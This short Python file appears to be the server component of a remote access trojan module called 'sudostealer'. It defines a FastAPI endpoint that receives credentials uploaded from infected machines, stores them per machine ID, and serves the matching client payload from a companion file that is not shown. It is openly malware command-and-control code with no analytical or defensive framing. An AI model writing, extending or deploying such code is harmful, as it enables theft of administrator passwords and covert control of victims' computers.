from fastapi import APIRouter, Request
from modules.rat_module import RatModule
from uid import Uid
import machines

class SudoStealer(RatModule):
	name = "sudostealer"
	router = APIRouter()
	credentials: list[str] = []

	@router.post("/upload/{machine_id}")
	async def upload_creds(machine_id: Uid, request: Request):
		text = await request.body()
		machines.all[machine_id].modules[SudoStealer.name].credentials.append(text)
	
	def get_client_code() -> str:
		with open(__file__.removesuffix("server.py")+"client.py", 'r') as f:
			return f.read()